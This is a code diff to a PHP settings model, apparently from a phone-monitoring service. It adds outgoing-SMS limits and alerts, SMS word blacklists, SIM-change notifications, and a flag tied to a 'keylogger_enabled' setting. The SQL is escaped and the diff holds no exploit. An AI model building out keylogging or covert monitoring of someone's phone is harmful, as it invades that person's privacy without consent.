@@ -86,17 +86,40 @@ class Settings extends BaseModel
         return $this->setPhonesBlackListString($devId, $value);
     }
 
-    public function setDeviceSettings($devId, $simNotifications, $blackWords)
+    public function setSimChangeNotifications($devId, $simNotifications)
     {
         $escapedDevId = $this->getDB()->quote($devId);
-        $blackWordsString = $this->getDB()->quote($this->rebuildBlackWordsList($blackWords));
         $escapedSimNotifications = $this->getDB()->quote($simNotifications);
 
         return $this->getDb()->exec("UPDATE 
                                             `dev_settings`
                                         SET 
-                                            `bl_words` = {$blackWordsString},
                                             `sim_notification` = {$escapedSimNotifications}
+                                        WHERE
+                                            `dev_id` = {$escapedDevId}");
+    }
+    
+    public function setSmsSettings($devId, $blackWords, $outgoingLimitation, $outgoingLimitationCount, $outgoingLimitationAlert, $outgoingLimitationMessage) {
+        
+        if (!strlen($outgoingLimitationMessage)) {
+            throw new Settings\InvalidSmsLimitationMessageException("Bad alert message!");
+        }
+        
+        $escapedDevId = $this->getDB()->quote($devId);
+        $blackWordsString = $this->getDB()->quote($this->rebuildBlackWordsList($blackWords));
+        $outgoingLimitation = $this->getDB()->quote($outgoingLimitation);
+        $outgoingLimitationCount = $this->getDB()->quote($outgoingLimitationCount);
+        $outgoingLimitationAlert = $this->getDB()->quote($outgoingLimitationAlert);
+        $outgoingLimitationMessage = $this->getDB()->quote($outgoingLimitationMessage);
+
+        return $this->getDb()->exec("UPDATE 
+                                            `dev_settings`
+                                        SET 
+                                            `bl_words` = {$blackWordsString},
+                                            `outgoing_sms_limitation` = {$outgoingLimitation},
+                                            `outgoing_sms_limitation_count` = {$outgoingLimitationCount},
+                                            `outgoing_sms_limitation_alert` = {$outgoingLimitationAlert},
+                                            `outgoing_sms_limitation_message` = {$outgoingLimitationMessage}
                                         WHERE
                                             `dev_id` = {$escapedDevId}");
     }
@@ -192,7 +215,7 @@ class Settings extends BaseModel
         if (($settings = $this->getDeviceSettings($devId)) === false) {
             throw new Settings\SettingsNotFoundException("Device settings not found");
         }
-
+        
         return array(
             'settings' => $settings,
             'blackListPhones' => $this->buildBlackList($settings['bl_phones']),
@@ -203,6 +226,8 @@ class Settings extends BaseModel
             'isBlackListAvailable' => DeviceOptions::isBlackListAvailable($devInfo['os']),
             'isSimNotificationAvailable' => DeviceOptions::isSimNotificationAvailable($devInfo['os']),
             'isDeviceCommandsAvailable' => DeviceOptions::isDeviceCommandsAvailable($devInfo['os']),
+            'isOutgoingSmsLimitationsAvailable' => DeviceOptions::isOutgoingSmsLimitationsAvailable($devInfo['os']),
+            'isOutgoingSmsLimitationsActive' => DeviceOptions::isOutgoingSmsLimitationsActive($devInfo['os'], $settings['keylogger_enabled'])
         );
     }
 
